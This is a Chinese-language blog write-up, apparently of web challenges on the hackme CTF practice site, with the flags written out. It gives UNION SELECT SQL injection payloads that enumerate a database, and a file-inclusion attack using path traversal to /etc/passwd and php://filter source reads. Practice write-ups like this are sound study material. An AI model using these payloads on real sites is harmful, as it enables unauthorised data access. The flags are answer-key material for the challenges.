CTF，這陣子心血來潮想說也來玩玩看好了，順便做個紀錄。<br>有些題目真的設計的蠻有趣的，後悔沒有早點接觸。</p><p>以下的內容包含<code>解答</code>，並且只有<code>Web</code>題內容，介意者請斟酌觀看。</p><hr><h2 class="relative group">Link<div id=link class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#link aria-label=定位點>#</a></span></h2><p>首頁：<a href=https://ctf.hackme.quest/ target=_blank>https://ctf.hackme.quest/</a></p><p>題目：<a href=https://ctf.hackme.quest/scoreboard/ target=_blank>https://ctf.hackme.quest/scoreboard/</a></p><p>輸入 Flag 的位置在題目頁面下方</p><hr><h2 class="relative group">15. <a href=https://ctf.hackme.quest/ target=_blank>hide and seek</a><div id=15-hide-and-seekhttpsctfhackmequest class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#15-hide-and-seekhttpsctfhackmequest aria-label=定位點>#</a></span></h2><blockquote><p>Can you see me? I&rsquo;m so close to you but you can&rsquo;t see me.</p></blockquote><p>這題是個開場，題目本身就在首頁 <a href=https://ctf.hackme.quest/ target=_blank>https://ctf.hackme.quest/</a> 中。<br>算是一個不成文的默契吧，第一題 flag 通常就放在原始碼下。</p><p><code>FLAG{0h U C meeeeeeeeeeeeeeeeeeee!}</code></p><p><figure><img class="my-0 rounded-md" loading=lazy srcset="/posts/ctf-hackme-web-write-up/15/1_hu97685eb5cc64784424bce55f014eb03c_17788_330x0_resize_box_3.png 330w,
/posts/ctf-hackme-web-write-up/15/1_hu97685eb5cc64784424bce55f014eb03c_17788_660x0_resize_box_3.png 660w,
/posts/ctf-hackme-web-write-up/15/1_hu97685eb5cc64784424bce55f014eb03c_17788_1024x0_resize_box_3.png 1024w,
/posts/ctf-hackme-web-write-up/15/1_hu97685eb5cc64784424bce55f014eb03c_17788_1320x0_resize_box_3.png 2x" src=/posts/ctf-hackme-web-write-up/15/1_hu97685eb5cc64784424bce55f014eb03c_17788_660x0_resize_box_3.png alt style=width:100%></figure></p><hr><h2 class="relative group">16. <a href=https://ctf.hackme.quest/gb target=_blank>guestbook</a><div id=16-guestbookhttpsctfhackmequestgb class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#16-guestbookhttpsctfhackmequestgb aria-label=定位點>#</a></span></h2><blockquote><p>This guestbook sucks. sqlmap is your friend.</p></blockquote><p>該頁面有一個讓訪客可以留言並觀看的功能，加上題目提示提到「<code>sqlmap</code>」，所以這題應該是 <code>SQL Injection</code>。</p><p><figure><img class="my-0 rounded-md" loading=lazy srcset="/posts/ctf-hackme-web-write-up/16/1_hued5e2fd892d5705aec7f2c4be9a1b529_27031_330x0_resize_box_3.png 330w,
/posts/ctf-hackme-web-write-up/16/1_hued5e2fd892d5705aec7f2c4be9a1b529_27031_660x0_resize_box_3.png 660w,
/posts/ctf-hackme-web-write-up/16/1_hued5e2fd892d5705aec7f2c4be9a1b529_27031_1024x0_resize_box_3.png 1024w,
/posts/ctf-hackme-web-write-up/16/1_hued5e2fd892d5705aec7f2c4be9a1b529_27031_1320x0_resize_box_3.png 2x" src=/posts/ctf-hackme-web-write-up/16/1_hued5e2fd892d5705aec7f2c4be9a1b529_27031_660x0_resize_box_3.png alt style=width:100%></figure></p><p>點擊<code>New Post</code>可以張貼文章，<code>Message List</code> 可以看到張貼的文章。<br>先發篇測試，然後到<code>Message List</code>查看：</p><p><figure><img class="my-0 rounded-md" loading=lazy srcset="/posts/ctf-hackme-web-write-up/16/2_huf131b337129dfb5ae99c7b516ed995c0_13128_330x0_resize_box_3.png 330w,
/posts/ctf-hackme-web-write-up/16/2_huf131b337129dfb5ae99c7b516ed995c0_13128_660x0_resize_box_3.png 660w,
/posts/ctf-hackme-web-write-up/16/2_huf131b337129dfb5ae99c7b516ed995c0_13128_1024x0_resize_box_3.png 1024w,
/posts/ctf-hackme-web-write-up/16/2_huf131b337129dfb5ae99c7b516ed995c0_13128_1320x0_resize_box_3.png 2x" src=/posts/ctf-hackme-web-write-up/16/2_huf131b337129dfb5ae99c7b516ed995c0_13128_660x0_resize_box_3.png alt style=width:100%></figure><br><figure><img class="my-0 rounded-md" loading=lazy srcset="/posts/ctf-hackme-web-write-up/16/3_hu036191b0425f12932ee3d00a8c81685a_15654_330x0_resize_box_3.png 330w,
/posts/ctf-hackme-web-write-up/16/3_hu036191b0425f12932ee3d00a8c81685a_15654_660x0_resize_box_3.png 660w,
/posts/ctf-hackme-web-write-up/16/3_hu036191b0425f12932ee3d00a8c81685a_15654_1024x0_resize_box_3.png 1024w,
/posts/ctf-hackme-web-write-up/16/3_hu036191b0425f12932ee3d00a8c81685a_15654_1320x0_resize_box_3.png 2x" src=/posts/ctf-hackme-web-write-up/16/3_hu036191b0425f12932ee3d00a8c81685a_15654_660x0_resize_box_3.png alt style=width:100%></figure></p><hr><p>到目前為止都沒問題，但看到了網址後，感覺有注入點可以嘗試。</p><p><figure><img class="my-0 rounded-md" loading=lazy srcset="/posts/ctf-hackme-web-write-up/16/4_hu2a58b0e7cbacb144c50f96e73c38e18c_6928_330x0_resize_box_3.png 330w,
/posts/ctf-hackme-web-write-up/16/4_hu2a58b0e7cbacb144c50f96e73c38e18c_6928_660x0_resize_box_3.png 660w,
/posts/ctf-hackme-web-write-up/16/4_hu2a58b0e7cbacb144c50f96e73c38e18c_6928_1024x0_resize_box_3.png 1024w,
/posts/ctf-hackme-web-write-up/16/4_hu2a58b0e7cbacb144c50f96e73c38e18c_6928_1320x0_resize_box_3.png 2x" src=/posts/ctf-hackme-web-write-up/16/4_hu2a58b0e7cbacb144c50f96e73c38e18c_6928_660x0_resize_box_3.png alt style=width:100%></figure></p><p>嘗試讓<code>id</code>值失效，並在後面加上臭名昭彰的<code>union select</code>大法試試，然後就踹到了：</p><pre tabindex=0><code>id=-133 UNION SELECT 1,2,3,4 -- #
</code></pre><p><figure><img class="my-0 rounded-md" loading=lazy srcset="/posts/ctf-hackme-web-write-up/16/5_hu193dbcaa3e56cba0ebb6140bbe9b2f21_5800_330x0_resize_box_3.png 330w,
/posts/ctf-hackme-web-write-up/16/5_hu193dbcaa3e56cba0ebb6140bbe9b2f21_5800_660x0_resize_box_3.png 660w,
/posts/ctf-hackme-web-write-up/16/5_hu193dbcaa3e56cba0ebb6140bbe9b2f21_5800_1024x0_resize_box_3.png 1024w,
/posts/ctf-hackme-web-write-up/16/5_hu193dbcaa3e56cba0ebb6140bbe9b2f21_5800_1320x0_resize_box_3.png 2x" src=/posts/ctf-hackme-web-write-up/16/5_hu193dbcaa3e56cba0ebb6140bbe9b2f21_5800_660x0_resize_box_3.png alt style=width:100%></figure></p><p>接著就開始循序踹<code>database name</code>、<code>table name</code>、<code>column name</code>&mldr;</p><pre tabindex=0><code>id=-133 UNION SELECT 1,2,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1),4 -- #
</code></pre><p>找到<code>table name</code>為「<code>flag</code>」</p><p><figure><img class="my-0 rounded-md" loading=lazy srcset="/posts/ctf-hackme-web-write-up/16/6_hub6245022b4f59c5f3b8b51396f03bef8_6156_330x0_resize_box_3.png 330w,
/posts/ctf-hackme-web-write-up/16/6_hub6245022b4f59c5f3b8b51396f03bef8_6156_660x0_resize_box_3.png 660w,
/posts/ctf-hackme-web-write-up/16/6_hub6245022b4f59c5f3b8b51396f03bef8_6156_1024x0_resize_box_3.png 1024w,
/posts/ctf-hackme-web-write-up/16/6_hub6245022b4f59c5f3b8b51396f03bef8_6156_1320x0_resize_box_3.png 2x" src=/posts/ctf-hackme-web-write-up/16/6_hub6245022b4f59c5f3b8b51396f03bef8_6156_660x0_resize_box_3.png alt style=width:100%></figure></p><pre tabindex=0><code>id=-133 UNION SELECT 1,2,(SELECT column_name FROM information_schema.columns WHERE table_name=&#39;flag&#39; LIMIT 1),4 -- #
</code></pre><p>找到<code>column name</code>也叫「<code>flag</code>」<br><figure><img class="my-0 rounded-md" loading=lazy srcset="/posts/ctf-hackme-web-write-up/16/7_huf23b26f02f257ba201e7e7838df45e7c_6098_330x0_resize_box_3.png 330w,
/posts/ctf-hackme-web-write-up/16/7_huf23b26f02f257ba201e7e7838df45e7c_6098_660x0_resize_box_3.png 660w,
/posts/ctf-hackme-web-write-up/16/7_huf23b26f02f257ba201e7e7838df45e7c_6098_1024x0_resize_box_3.png 1024w,
/posts/ctf-hackme-web-write-up/16/7_huf23b26f02f257ba201e7e7838df45e7c_6098_1320x0_resize_box_3.png 2x" src=/posts/ctf-hackme-web-write-up/16/7_huf23b26f02f257ba201e7e7838df45e7c_6098_660x0_resize_box_3.png alt style=width:100%></figure></p><p>接著直接查詢該欄位第一筆資料：</p><pre tabindex=0><code>id=-133 UNION SELECT 1,2,(SELECT flag FROM flag LIMIT 1),4 – #
</code></pre><p>有點尷尬的是它回覆了一個網址，該網址是一張動圖&mldr;</p><p><figure><img class="my-0 rounded-md" loading=lazy srcset="/posts/ctf-hackme-web-write-up/16/8_hud6fb737e0ae2f48629c8504a58f940bc_12291_330x0_resize_box_3.png 330w,
/posts/ctf-hackme-web-write-up/16/8_hud6fb737e0ae2f48629c8504a58f940bc_12291_660x0_resize_box_3.png 660w,
/posts/ctf-hackme-web-write-up/16/8_hud6fb737e0ae2f48629c8504a58f940bc_12291_1024x0_resize_box_3.png 1024w,
/posts/ctf-hackme-web-write-up/16/8_hud6fb737e0ae2f48629c8504a58f940bc_12291_1320x0_resize_box_3.png 2x" src=/posts/ctf-hackme-web-write-up/16/8_hud6fb737e0ae2f48629c8504a58f940bc_12291_660x0_resize_box_3.png alt style=width:100%></figure><br><figure><img class="my-0 rounded-md" loading=lazy srcset="/posts/ctf-hackme-web-write-up/16/3o72FdPiRXBRbBLUc0_hu50302dabd7113b270fc6447908985974_504943_330x0_resize_box_1.gif 330w,
/posts/ctf-hackme-web-write-up/16/3o72FdPiRXBRbBLUc0_hu50302dabd7113b270fc6447908985974_504943_660x0_resize_box_1.gif 660w,
/posts/ctf-hackme-web-write-up/16/3o72FdPiRXBRbBLUc0_hu50302dabd7113b270fc6447908985974_504943_1024x0_resize_box_1.gif 1024w,
/posts/ctf-hackme-web-write-up/16/3o72FdPiRXBRbBLUc0_hu50302dabd7113b270fc6447908985974_504943_1320x0_resize_box_1.gif 2x" src=/posts/ctf-hackme-web-write-up/16/3o72FdPiRXBRbBLUc0_hu50302dabd7113b270fc6447908985974_504943_660x0_resize_box_1.gif alt style=width:100%></figure></p><p>找第二筆資料就可以看到 flag 了：</p><pre tabindex=0><code>id=-133 UNION SELECT 1,2,(SELECT flag FROM flag LIMIT 1,1),4 – #
</code></pre><p><figure><img class="my-0 rounded-md" loading=lazy srcset="/posts/ctf-hackme-web-write-up/16/9_hue30f9051b030e616a525ef2c480e4a50_15453_330x0_resize_box_3.png 330w,
/posts/ctf-hackme-web-write-up/16/9_hue30f9051b030e616a525ef2c480e4a50_15453_660x0_resize_box_3.png 660w,
/posts/ctf-hackme-web-write-up/16/9_hue30f9051b030e616a525ef2c480e4a50_15453_1024x0_resize_box_3.png 1024w,
/posts/ctf-hackme-web-write-up/16/9_hue30f9051b030e616a525ef2c480e4a50_15453_1320x0_resize_box_3.png 2x" src=/posts/ctf-hackme-web-write-up/16/9_hue30f9051b030e616a525ef2c480e4a50_15453_660x0_resize_box_3.png alt style=width:100%></figure></p><hr><h2 class="relative group">17. <a href=https://ctf.hackme.quest/lfi/ target=_blank>LFI</a><div id=17-lfihttpsctfhackmequestlfi class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#17-lfihttpsctfhackmequestlfi aria-label=定位點>#</a></span></h2><blockquote><p>What this admin&rsquo;s password? That is not important at all, just get the flag.<br>Tips: LFI, <code>php://filter</code></p></blockquote><p>該頁面共有四個連結，「Hack Me」連到首頁，其餘三個分別是採用<code>GET</code>方式傳路徑的方式，估計是用該參數來決定要引入什麼頁面，而這邊應該就有漏洞了。</p><p><figure><img class="my-0 rounded-md" loading=lazy srcset="/posts/ctf-hackme-web-write-up/17/1_huf06ffa8678c60349d7ac1e1875bde5d4_8902_330x0_resize_box_3.png 330w,
/posts/ctf-hackme-web-write-up/17/1_huf06ffa8678c60349d7ac1e1875bde5d4_8902_660x0_resize_box_3.png 660w,
/posts/ctf-hackme-web-write-up/17/1_huf06ffa8678c60349d7ac1e1875bde5d4_8902_1024x0_resize_box_3.png 1024w,
/posts/ctf-hackme-web-write-up/17/1_huf06ffa8678c60349d7ac1e1875bde5d4_8902_1320x0_resize_box_3.png 2x" src=/posts/ctf-hackme-web-write-up/17/1_huf06ffa8678c60349d7ac1e1875bde5d4_8902_660x0_resize_box_3.png alt style=width:100%></figure></p><p>舉例<code>Home</code>連結傳送了「<code>?page=pages/index</code>」，先嘗試更改路徑成不存在的目錄<code>?page=pages/abc</code>：</p><p><figure><img class="my-0 rounded-md" loading=lazy srcset="/posts/ctf-hackme-web-write-up/17/2_hu611633b1dcbca149ea1ef3dd4ef30821_11955_330x0_resize_box_3.png 330w,
/posts/ctf-hackme-web-write-up/17/2_hu611633b1dcbca149ea1ef3dd4ef30821_11955_660x0_resize_box_3.png 660w,
/posts/ctf-hackme-web-write-up/17/2_hu611633b1dcbca149ea1ef3dd4ef30821_11955_1024x0_resize_box_3.png 1024w,
/posts/ctf-hackme-web-write-up/17/2_hu611633b1dcbca149ea1ef3dd4ef30821_11955_1320x0_resize_box_3.png 2x" src=/posts/ctf-hackme-web-write-up/17/2_hu611633b1dcbca149ea1ef3dd4ef30821_11955_660x0_resize_box_3.png alt style=width:100%></figure></p><p>嘗試訪問敏感資訊<code>?page=pages/../../etc/passwd</code>：</p><p><figure><img class="my-0 rounded-md" loading=lazy srcset="/posts/ctf-hackme-web-write-up/17/3_hu8cf05f7390d1be8958c73c8544de4349_7892_330x0_resize_box_3.png 330w,
/posts/ctf-hackme-web-write-up/17/3_hu8cf05f7390d1be8958c73c8544de4349_7892_660x0_resize_box_3.png 660w,
/posts/ctf-hackme-web-write-up/17/3_hu8cf05f7390d1be8958c73c8544de4349_7892_1024x0_resize_box_3.png 1024w,
/posts/ctf-hackme-web-write-up/17/3_hu8cf05f7390d1be8958c73c8544de4349_7892_1320x0_resize_box_3.png 2x" src=/posts/ctf-hackme-web-write-up/17/3_hu8cf05f7390d1be8958c73c8544de4349_7892_660x0_resize_box_3.png alt style=width:100%></figure></p><p>確診 LFI</p><p>題目提示「<code>php://filter</code>」，這是 PHP 的功能，我們可以利用它來幫助我們讀出原始碼，這很常在 CTF 上看到。</p><p>使用<code>php://filter/read=convert.base64-encode/resource=path</code>即可以<code>base64</code>編碼的方式讀取該檔案(<code>resource</code>的值)，於是乎：</p><pre tabindex=0><code>?page=php://filter/read=convert.base64-encode/resource=pages/index
</code></pre><p><figure><img class="my-0 rounded-md" loading=lazy srcset="/posts/ctf-hackme-web-write-up/17/4_hu3e3adf5decf4db25443ca035e59b78ed_14104_330x0_resize_box_3.png 330w,
/posts/ctf-hackme-web-write-up/17/4_hu3e3adf5decf4db25443ca035e59b78ed_14104_660x0_resize_box_3.png 660w,
/posts/ctf-hackme-web-write-up/17/4_hu3e3adf5decf4db25443ca035e59b78ed_14104_1024x0_resize_box_3.png 1024w,
/posts/ctf-hackme-web-write-up/17/4_hu3e3adf5decf4db25443ca035e59b78ed_14104_1320x0_resize_box_3.png 2x" src=/posts/ctf-hackme-web-write-up/17/4_hu3e3adf5decf4db25443ca035e59b78ed_14104_660x0_resize_box_3.png alt style=width:100%></figure></p><p>把它拿去解碼，得到訊息「<code>There is no second place like 127.0.0.1</code>」，看來 flag 不在這個檔案中。<br>嘗試看看<code>Login</code>，並解碼：</p><pre tabindex=0><code>?page=php://filter/read=convert.base64-encode/resource=pages/login
</code></pre><p><figure><img class="my-0 rounded-md" loading=lazy srcset="/posts/ctf-hackme-web-write-up/17/5_hu4ee9dbda80bb447fb937f3da9edff079_22040_330x0_resize_box_3.png 330w,
/posts/ctf-hackme-web-write-up/17/5_hu4ee9dbda80bb447fb937f3da9edff079_22040_660x0_resize_box_3.png 660w,
/posts/ctf-hackme-web-write-up/17/5_hu4ee9dbda80bb447fb937f3da9edff079_22040_1024x0_resize_box_3.png 1024w,
/posts/ctf-hackme-web-write-up/17/5_hu4ee9dbda80bb447fb937f3da9edff079_22040_1320x0_resize_box_3.png 2x" src=/posts/ctf-hackme-web-write-up/17/5_hu4ee9dbda80bb447fb937f3da9edff079_22040_660x0_resize_box_3.png alt style=width:100%></figure></p><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-phtml data-lang=phtml><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#78787e>&lt;?php</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span><span style=color:#ff6ac1>require</span>(<span style=color:#5af78e>&#39;config.php&#39;</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span><span style=color:#ff6ac1>if</span>(<span style=color:#ff5c57>$_POST</span>[<span style=color:#5af78e>&#39;user&#39;</span>] <span style=color:#ff6ac1>===</span> <span style=color:#5af78e>&#39;admin&#39;</span> <span style=color:#ff6ac1>&amp;&amp;</span> md5(<span style=color:#ff5c57>$_POST</span>[<span style=color:#5af78e>&#39;pass&#39;</span>]) <span style=color:#ff6ac1>===</span> <span style=color:#5af78e>&#39;bed128365216c019988915ed3add75fb&#39;</span>) {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>    <span style=color:#ff6ac1>echo</span> <span style=color:#ff5c57>$flag</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span>} <span style=color:#ff6ac1>else</span> {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span><span style=color:#78787e>?&gt;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span>&lt;<span style=color:#ff6ac1>form</span> <span style=color:#57c7ff>action</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;?page=pages/login&#34;</span> <span style=color:#57c7ff>method</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;post&#34;</span> <span style=color:#57c7ff>role</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;form&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span> &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;form-group&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>  &lt;<span style=color:#ff6ac1>label</span> <span style=color:#57c7ff>for</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;user-i&#34;</span>&gt;User&lt;/<span style=color:#ff6ac1>label</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>  &lt;<span style=color:#ff6ac1>input</span> <span style=color:#57c7ff>type</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;text&#34;</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;form-control&#34;</span> <span style=color:#57c7ff>id</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;user-i&#34;</span> <span style=color:#57c7ff>placeholder</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;Username&#34;</span> <span style=color:#57c7ff>name</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;user&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span> &lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span> &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;form-group&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span>  &lt;<span style=color:#ff6ac1>label</span> <span style=color:#57c7ff>for</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;pass-i&#34;</span>&gt;Password&lt;/<span style=color:#ff6ac1>label</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span>  &lt;<span style=color:#ff6ac1>input</span> <span style=color:#57c7ff>type</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;password&#34;</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;form-control&#34;</span> <span style=color:#57c7ff>id</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;pass-i&#34;</span> <span style=color:#57c7ff>placeholder</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;Password&#34;</span> <span style=color:#57c7ff>name</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;pass&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span> &lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span> &lt;<span style=color:#ff6ac1>button</span> <span style=color:#57c7ff>type</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;submit&#34;</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;btn btn-primary&#34;</span>&gt;Login&lt;/<span style=color:#ff6ac1>button</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span>&lt;/<span style=color:#ff6ac1>form</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span><span style=color:#78787e>&lt;?php</span> } <span style=color:#78787e>?&gt;</span>
</span></span></code></pre></div><p>找到變數<code>$flag</code>，但似乎是被宣告在<code>config.php</code>這個檔案中，所以再用<code>php://filter</code>戳它一次：</p><pre tabindex=0><code>?page=php://filter/read=convert.base64-encode/resource=pages/config
</code></pre><p><figure><img class="my-0 rounded-md" loading=lazy srcset="/posts/ctf-hackme-web-write-up/17/6_huba793fd92132e25747d54f69b72d2b0d_19103_330x0_resize_box_3.png 330w,
/posts/ctf-hackme-web-write-up/17/6_huba793fd92132e25747d54f69b72d2b0d_19103_660x0_resize_box_3.png 660w,
/posts/ctf-hackme-web-write-up/17/6_huba793fd92132e25747d54f69b72d2b0d_19103_1024x0_resize_box_3.png 1024w,
/posts/ctf-hackme-web-write-up/17/6_huba793fd92132e25747d54f69b72d2b0d_19103_1320x0_resize_box_3.png 2x" src=/posts/ctf-hackme-web-write-up/17/6_huba793fd92132e25747d54f69b72d2b0d_19103_660x0_resize_box_3.png alt style=width:100%></figure></p><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-phtml data-lang=phtml><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span><span style=color:#78787e>&lt;?php</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span><span style=color:#ff5c57>$flag</span> <span style=color:#ff6ac1>=</span> <span style=color:#5af78e>&#34;FLAG{Yoooooo_LFI_g00d_2cXxsXSYP9EVLrIo}&#34;</span>;
</span></span></code></pre></div><hr><h2 class="relative group">18. <a href=https://ctf.hackme.quest/ target=_blank>homepage</a><div id=18-homepagehttpsctfhackmequest class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#18-homepagehttpsctfhackmequest aria-label=定位點>#</a></span></h2><blockquote><p>Where is the flag? Did you check the code?</p></blockquote><p>這題一樣是在首頁，題目提示你看程式碼的部份。</p><p>其實只要看 console 的部份就可以看到大大的 QR Code 了<br>掃下去就可以得到 Flag <code>FLAG{Oh, You found me!!!!!! Yeeeeeeee.}</code></p><p><figure><img class="my-0 rounded-md" loading=lazy srcset="/posts/ctf-hackme-web-write-up/18/1_hu6274031865056b914c4595559c48e21d_9861_330x0_resize_box_3.png 330w,
/posts/ctf-hackme-web-write-up/18/1_hu6274031865056b914c4595559c48e21d_9861_660x0_resize_box_3.png 660w,
/posts/ctf-hackme-web-write-up/18/1_hu6274031865056b914c4595559c48e21d_9861_1024x0_resize_box_3.png 1024w,
/posts/ctf-hackme-web-write-up/18/1_hu6274031865056b914c4595559c48e21d_9861_1320x0_resize_box_3.png 2x" src=/posts/ctf-hackme-web-write-up/18/1_hu6274031865056b914c4595559c48e21d_9861_660x0_resize_box_3.png alt style=width:100%></figure></p><p>這邊是去引入一個叫做<code>cute.js</code>的檔案，裡面的東西非常奇葩&mldr;</p><p><figure><img class="my-0 rounded-md" loading=lazy srcset="/posts/ctf-hackme-web-write-up/18/2_hu97d9ddc305d363cec9277f52c149d5ca_155249_330x0_resize_box_3.png 330w,
/posts/ctf-hackme-web-write-up/18/2_hu97d9ddc305d363cec9277f52c149d5ca_155249_660x0_resize_box_3.png 660w,
/posts/ctf-hackme-web-write-up/18/2_hu97d9ddc305d363cec9277f52c149d5ca_155249_1024x0_resize_box_3.png 1024w,
/posts/ctf-hackme-web-write-up/18/2_hu97d9ddc305d363cec9277f52c149d5ca_155249_1320x0_resize_box_3.png 2x" src=/posts/ctf-hackme-web-write-up/18/2_hu97d9ddc305d363cec9277f52c149d5ca_155249_660x0_resize_box_3.png alt style=width:100%></figure></p><p>後來看到有人說是一種叫做「<code>AAEncode</code>」的編碼&mldr;專門把 Javascript 轉成顏文字。</p><p>拿去 Decode 之後就可以得到：</p><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#ff5c57>function</span> print_qrcode(qrcode, color, fill) {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span>  <span style=color:#ff5c57>var</span> args <span style=color:#ff6ac1>=</span> [];
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>  <span style=color:#ff5c57>var</span> buff <span style=color:#ff6ac1>=</span> [];
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span>  <span style=color:#ff6ac1>for</span> (<span style=color:#ff5c57>var</span> i <span style=color:#ff6ac1>=</span> <span style=color:#ff9f43>0</span>; i <span style=color:#ff6ac1>&lt;</span> qrcode.length; i<span style=color:#ff6ac1>++</span>) {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>    <span style=color:#ff5c57>var</span> row <span style=color:#ff6ac1>=</span> qrcode[i];
